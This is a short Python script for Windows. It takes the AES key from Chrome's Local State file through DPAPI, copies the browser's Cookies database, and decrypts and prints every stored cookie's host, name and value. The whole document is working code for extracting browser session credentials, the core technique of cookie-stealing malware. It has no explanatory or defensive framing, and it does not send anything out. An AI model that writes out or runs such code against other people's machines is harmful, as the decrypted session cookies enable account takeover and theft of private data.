import os
import json
import base64
import sqlite3
import shutil
from Cryptodome.Cipher import AES
import win32crypt

# Get AES key
local_state_path = os.path.expanduser(
    r'~\AppData\Local\Google\Chrome\User Data\Local State'
)

with open(local_state_path, "r") as f:
    local_state = json.load(f)

encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix

aes_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Copy Cookies DB (Chrome locks original)
cookie_db = os.path.expanduser(
    r'~\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
)

shutil.copy(cookie_db, "Cookies_temp.db")

conn = sqlite3.connect("Cookies_temp.db")
cursor = conn.cursor()

cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

def decrypt_cookie(encrypted_value):
    try:
        # AES-GCM encrypted cookies start with "v10" or "v11"
        if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
            nonce = encrypted_value[3:15]
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt(encrypted_value[15:])
            return decrypted.decode()

        # Old style DPAPI (rare)
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

    except:
        return None

for host, name, encrypted_value in cursor.fetchall():
    value = decrypt_cookie(encrypted_value)
    print(f"{host} | {name} = {value}")

conn.close()
os.remove("Cookies_temp.db")
